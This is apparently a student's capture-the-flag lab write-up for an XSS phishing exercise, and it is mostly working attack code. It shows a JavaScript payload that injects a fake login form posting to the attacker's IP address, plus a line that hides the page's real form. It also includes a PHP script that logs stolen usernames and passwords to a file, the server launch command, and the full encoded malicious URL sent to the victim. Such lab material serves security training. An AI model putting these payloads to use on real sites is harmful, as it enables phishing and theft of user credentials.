# [Phishing](Cross-Site%20Scripting%20(XSS)/Phishing.md)
### Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.16.78><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
![](Screenshot%202026-06-27%20at%2014.31.17.png)
![](Screenshot%202026-06-27%20at%2014.31.39.png)

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.16.78><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```
![](Screenshot%202026-06-27%20at%2014.34.27.png)

```php
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://10.129.40.62/phishing/index.php"); fclose($file); exit(); } ?>
```
![](Screenshot%202026-06-27%20at%2014.47.05.png)

```shell
sudo php -S 0.0.0.0:80
```

Then go to /send.php and put the url into

```url
http://10.129.40.62/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.16.78%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B
```
![](Screenshot%202026-06-27%20at%2014.58.20.png)

We got the password 
![](Screenshot%202026-06-27%20at%2014.58.50.png)
![](Screenshot%202026-06-27%20at%2014.59.24.png)
